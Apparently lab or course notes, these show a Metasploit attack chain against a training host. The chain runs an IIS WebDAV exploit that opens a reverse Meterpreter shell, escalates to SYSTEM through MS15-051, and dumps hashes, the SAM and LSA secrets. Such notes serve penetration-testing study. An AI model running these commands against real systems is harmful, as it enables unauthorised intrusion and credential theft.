## Using Meterpreter
#### MSF - Scanning Target

```shell
msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15
```
#### MSF - Searching for Exploit

```shell
msf6 > search iis_webdav_upload_asp
```
#### MSF - Configuring Exploit & Payload

```shell
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15

RHOST => 10.10.10.15

msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0

LHOST => tun0

msf6 exploit(windows/iis/iis_webdav_upload_asp) > run

meterpreter >
```
#### MSF - Meterpreter Migration

```shell
meterpreter > getuid
```
#### MSF - Interacting with the Target

```shell
c:\Inetpub>dir

c:\Inetpub>cd AdminScripts
```
#### MSF - Session Handling

```shell
meterpreter > bg
```

```shell
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
```
#### MSF - Privilege Escalation

```shell
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_images

msf6 exploit(windows/local/ms15_051_client_copy_image) > show options

msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1 

session => 1

msf6 exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0 

LHOST => tun0

msf6 exploit(windows/local/ms15_051_client_copy_image) > run

meterpreter > getuid Server username: 

NT AUTHORITY\SYSTEM
```
#### MSF - Dumping Hashes

```shell
meterpreter > hashdump

meterpreter > lsa_dump_sam
```
#### MSF - Meterpreter LSA Secrets Dump

```shell
meterpreter > lsa_dump_secrets
```

